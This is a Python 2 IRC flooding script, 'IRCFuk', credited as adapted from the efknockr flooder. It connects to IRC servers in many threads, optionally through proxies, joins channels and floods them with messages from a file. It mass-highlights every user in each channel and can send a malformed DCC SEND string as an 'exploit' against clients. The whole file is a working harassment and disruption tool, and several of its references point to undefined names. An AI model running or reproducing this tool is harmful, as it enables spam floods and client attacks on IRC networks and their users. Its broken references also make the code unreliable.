#!/usr/bin/python2
# IRCFuk
# When you feel you need to fuk IRC folks.
# Made by Ragnax
# Largely copied from acidvegas' efknockr irc flooder (https://github.com/acidvegas/trollbots/tree/master/efknockr)
# Only the threading system has changed as well as some strings. Awesome code acidvegas!

import sys
import datetime
import time
import subprocess
import threading
import socket
import socks
import ssl
import random
import config as conf

sys.dont_write_bytecode = True

# VARS
total_threads=conf.max_threads

threads = []
lock = threading.RLock()
t_zero = time.time()
servers={}

class fuk_thread (threading.Thread):
    def __init__(self, thrID):
            threading.Thread.__init__(self)
            self.name = "thr"+str(thrID)
            self.nick = conf.nick
            self.exploit = conf.exploit
            self.timeout = conf.timeout
            self.proxy = conf.proxy
            self.vhost = conf.vhost
            self.mass_hilite = conf.mass_hilite
            self.message_throttle = conf.message_throttle
            self.join_throttle = conf.join_throttle
            self.max_channels = conf.max_channels
            self.minimum_users = conf.minimum_users
            self.part_message = conf.part_message
            self.bad_numerics = conf.bad_numerics
            self.bad_msgs = conf.bad_msgs

            self.connected = False
            self.bad_channels = list()
            self.current_channels = list()
            self.msg = open("./msg", "rb").readlines()
            self.nicklist = dict()
            self.sock = None

    def run(self):
            while not len(conf.servers) == 0:
                    lock.acquire()
                    lock.release()
                    (self.ip, self.config) = conf.servers.popitem()
                    self.channels = self.config["channels"]
                    self.connect()


    def fuk(self):
        random.shuffle(self.channels)
        for channel in self.channels:
            if not self.connected:
                break
            try:
                self.join(channel)
                time.sleep(self.join_throttle)
                while len(self.current_channels) >= self.max_channels:
                    time.sleep(1)
            except Exception as ex:
                self.log("e", "Error occured in the fuk loop... (" + str(ex) + ")")
                break


    def connect(self):
        try:
            self.makesock()
            self.sock.connect((self.ip, self.config["port"]))
            if self.config["password"] is not None:
                self.raw("PASS " + self.password)
            self.raw("USER " + random_str(random_int(8,10)) + " " + random_str(random_int(8,10)) + " " + random_str(random_int(8,10)) + " :" + random_str(random_int(8, 10)))
            self.setnick(self.nick)
        except Exception as ex:
            self.log("e", "Failed to connect to server " + self.ip)
            self.event_disconnect()
        else:
            self.listen()



    def dcc(self, target, data):
        self.privmsg(target, "\x01DCC SEND " + data + "\x01")

    def event_connect(self):
        self.log("s", "Connected to " + self.ip)
        self.connected = True
        if self.channels is not None:
            threading.Thread(target=self.fuk).start()
        else:
            self.channels = []
            self.raw("LIST >" + str(self.minimum_users))

    def event_disconnect(self):
        self.connected = False
        self.sock.close()

    def event_end_of_names(self, chan):
        self.current_channels.append(chan)
        self.log("i", "fuking channel " + chan + " on " + self.ip + "...")
        try:
            for line in self.msg:
                if chan in self.bad_channels:
                    break
                self.privmsg(chan, line)
                time.sleep(self.message_throttle)
            if self.exploit:
                self.dcc(chan, '" ' + random_str(random_int(10,99)) + " " + random_str(random_int(10,99)) + " " + self.random_str(random_int(10,99)))
            if chan in self.nicklist and chan not in self.bad_channels:
                self.nicklist[chan] = ' '.join(self.nicklist[chan])
                if len(self.nicklist[chan]) <= 300:
                    self.sendmsg(chan, self.nicklist[chan])
                else:
                    while len(self.nicklist[chan]) > 300:
                        if chan in self.bad_channels:
                            break
                        seg = self.nicklist[chan][:300]
                        seg = seg[:-len(seg.split()[len(segment.split())-1])]
                        self.privmsg(chan, seg)
                        self.nicklist[chan] = self.nicklist[chan][len(segment):]
                        time.sleep(self.message_throttle)
        except Exception as ex:
            self.log("w", "Error while fuking " + chan + " on " + self.ip + " - (" +str(ex)+ ")")
        finally:
            if chan in self.current_channels:
                self.current_channels.remove(chan)
            if chan in self.bad_channels:
                self.bad_channels.remove(chan)
            if chan in self.nicklist:
                del self.nicklist[chan]
            try:
                self.part(chan, self.part_message)
            except:
                pass

    def event_list_channel(self, chan, users):
        self.channels.append(chan)

    def event_nick_already_used(self):
        self.nick = self.nick + "_"
        self.setnick(self.nick)
    
    def event_names(self, chan, names):
        if self.mass_hilite:
            if not chan in self.nicklist:
                self.nicklist[chan] = list()
            for name in names:
                if name[:1] in '~!@%&+:':
                    name = name[1:]
                    if name != self.nick and name not in self.nicklist[chan]:
                        self.nicklist[chan].append(name)


    def event_end_of_list(self):
        if self.channels:
            self.log("i", 'Loaded '+str(len(self.channels))+' channels from' + self.ip)
            threading.Thread(target=self.fuk).start()
        else:
            self.log("w", 'Found zero channels on ' + self.ip)
            self.raw('QUIT')

    def event(self, data):
        args=data.split()
        if args[0] == "PING":
            self.raw("PONG :" + args[1][1:])
        elif args[1] == "001":
            self.event_connect()
        elif args[1] == "322":
            if len(args) >= 5:
                chan = args[3]
                users = args[4]
                self.event_list_channel(chan, users)
        elif args[1] == "323":
            self.event_end_of_list()
        elif args[1] == "353":
            chan = args[4]
            if chan + ' :' in data:
                names = data.split(chan + ' :')[1].split()
            elif ' *' in data:
                names = data.split(' *')[1].split()
            elif ' =' in data:
                names = data.split(' =')[1].split()
            else:
                names = data.split(chan)[1].split()
            self.event_names(chan, names)
        elif args[1] == '366':
            chan = args[3]
            threading.Thread(target=self.event_end_of_names, args=(chan,)).start()
        elif args[1] == '404':
            chan = args[3]
            for item in self.bad_msgs:
                if item in data:
                    self.log("w", "Failed to message " + chan + " on " + self.ip)
                    if chan not in self.bad_channels:
                        self.bad_channels.append(chan)
        elif args[1] == '433':
            self.event_nick_already_used()
        elif args[1] in self.bad_numerics:
            chan = args[3]
            self.log("e", "Failed to fuk " + chan + " on " + self.ip)
        elif args[1] == 'PART':
            nick = args[0].split('!')[0][1:]
            chan = args[2]
            if nick == self.nick and chan == self.channels[len(self.channels)-1]:
                self.quit()

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if data:
                    for line in [line for line in data.split('\r\n') if line]:
                        if line.startswith('ERROR :Closing Link:'):
                            self.log("i", "Connection closed.")
                        elif len(line.split()) >= 2:
                            self.event(line)
                else:
                    break
            except(UnicodeDecodeError,UnicodeEncodeError) as ex:
                pass
            except Exception as ex:
                self.log("e", "Unexpected error : " + str(ex))
                break
        self.event_disconnect()

    def makesock(self):
        if self.config["ipv6"]:
            family = socket.AF_INET6
        else:
            family = socket.AF_INET

        if self.proxy is not None:
            proxy_serv, proxy_port = self.proxy.split(":")
            self.sock = socks.socket(family, socket.SOCK_STREAM)
            self.sock.setblocking(0)
            self.sock.setproxy(socks.PROXY_TYPE_SOCKS5, proxy_serv, proxy_port)
        else:
            self.sock = socket.socket(family, socket.SOCK_STREAM)

        self.sock.settimeout(self.timeout)
        if self.vhost is not None:
            self.sock.bind((self.vhost, 0))
        if self.config["ssl"]:
            self.sock = ssl.wrap_socket(self.sock)


    def raw(self, msg):
        self.sock.send(bytes(msg + "\r\n"))

    def setnick(self, nick):
        self.raw("NICK " + nick)

    def join(self, chan):
        self.raw("JOIN " + chan)

    def privmsg(self, target, msg):
        self.raw("PRIVMSG " + str(target) + " :" + str(msg))

    def quit(self):
        self.raw("QUIT")

    def part(self, target, msg):
        self.raw("PART " + str(target) + " :" + str(msg))


    def log(self,status,msg):
            lock.acquire()
            if (status == "e"):
                    sys.stdout.write("[\033[0;31mx\033[0m] ")
            elif (status == "w"):
                    sys.stdout.write("[\033[0;33m!\033[0m] ")
            elif (status == "i"):
                    sys.stdout.write("[\033[0;35m*\033[0m] ")
            elif (status == "?"):
                    sys.stdout.write("[\033[0;34m?\033[0m] ")
            elif (status == "s"):
                    sys.stdout.write("[\033[0;36m~\033[0m] ")
            else:
                    sys.stdout.write("[\033[0;32m+\033[0m] ")

            sys.stdout.write(self.name + " - " + time.strftime("%Y-%m-%d %H:%M:%S") + ">> ")
            sys.stdout.write(msg + "\n")
            sys.stdout.flush()
            lock.release()
			

def random_int(min,max):
    return random.randint(min,max)

def random_str(length):
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(length))

def start(total_threads):
    cnt=len(conf.servers)
    if total_threads > cnt:
        total_threads=cnt

    for i in xrange(total_threads):
        t = fuk_thread(i)
        t.daemon = True
        t.start()
        threads.append(t)

    all_threads_dead=False
    while not all_threads_dead:
        all_threads_dead = True
        for t in threads:
            if t.isAlive():
                all_threads_dead = False
                break
        time.sleep(0.05)


start(total_threads)
